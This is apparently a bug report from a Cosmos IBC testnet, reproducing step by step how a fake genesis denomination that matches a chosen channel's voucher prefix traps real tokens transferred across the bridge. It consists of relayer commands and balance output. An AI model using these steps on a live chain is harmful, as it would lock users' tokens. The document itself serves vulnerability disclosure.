
# Invalidate REAL tokens by minting fake tokens

## Steps to reproduce
###

### 1. Setup the chain with initial tokens to match with channel names in the path. Let's say the channel name is "regentestchan" and the tokens on destination chain are "doubloons".

```
...
gaiacli gaiad add-genesis-account gozkey 10000000000$DENOM,1000000000000000transfer/regentestchan/doubloons
...
```
This will initialize the account with 2 tokens, one is default chain specific token and other is a fake token to trap destination tokens.

### 2. Initialize the relayer and configure chains, keys
### 3. Create a new path and use "regentestchan" as channel name
 
  ```
  rly pth add regengoz-3 gameofzoneshub-3 regenpath  
  ```
 
*Note: to keep it simple, you can just use "regentestchan" for every input (client, connection and channels). Port is "transfer"*
  
  How the config looks like:
  ```
    Path "regenpath" strategy(naive):
    SRC(regen-3)
    ClientID:     regentestchan
    ConnectionID: regentestchan
    ChannelID:    regentestchan
    PortID:       transfer
    DST(gameofzoneshub-3)
    ClientID:     regentestchan
    ConnectionID: regentestchan
    ChannelID:    regentestchan
    PortID:       transfer
  ```

### 4. Link the path
  ```
  rly tx link regenpath
  ```
  
### 5. Now, query the initial balances
  ```
  root@regen:~# rly q bal regengoz-3
  1000000000000000transfer/regentestchan/doubloons,999999999925000utree

  root@regen:~# rly q bal gameofzoneshub-3
  9999996500doubloons
  ```

### 6. Make a transfer of 10000doubloons from destination chain (hub) to source. 

  ```
  root@regen:~# rly tx transfer gameofzoneshub-3 regengoz-3 10000doubloons false $(rly ch addr regengoz-3)
  I[2020-06-05|09:11:42.089] ✔️ [gameofzoneshub-3]@{46346} - msg(0:transfer) hash(3544031185C720B32AF33F1E5B63F6A12E1C052C626258B505DDE216C73B44D8) 
  I[2020-06-05|09:11:51.962] ✔️ [regengoz-3]@{166} - msg(0:update_client,1:ics04/opaque) hash(D4F98CB4BB85E4D2F0C3B8EC3B9A6517ADA11BC4A319F1FEC6822F7A302A6526) 
  ```

### 7. Query balances
```
  root@regen:~# rly q bal gameofzoneshub-3
  9999986000doubloons
  root@regen:~# rly q bal regengoz-3
  1000000000010000transfer/regentestchan/doubloons,999999999920000utree
```
all looks good, the transferred tokens are appended to initially created fake tokens.

### 8. Now transfer back the tokens from source to chain (i.e., 10000doubloons)

  ```
  root@regen:~# rly tx transfer regengoz-3 gameofzoneshub-3 10000doubloons false $(rly ch addr gameofzoneshub-3)
  I[2020-06-05|09:12:52.274] ✘ [regengoz-3]@{181} - msg(0:transfer) err(sdk:5:failed to execute message; message index: 0: 0doubloons is smaller than 10000doubloons: insufficient funds) 
  Error: failed to send first transaction
  ```

tried with source: true too, just to cross check
  ```
  root@regen:~# rly tx transfer regengoz-3 gameofzoneshub-3 10000doubloons true $(rly ch addr gameofzoneshub-3)
  I[2020-06-05|09:12:52.274] ✘ [regengoz-3]@{178} - msg(0:transfer) err(sdk:5:failed to execute message; message index: 0: 0doubloons is smaller than 10000doubloons: insufficient funds) 
  Error: failed to send first transaction
  ```
  
This is failing. We are unable to transfer tokens back to the hub. It says it has 0 funds. Can't even transfer single token from zone (source) to hub (dest).
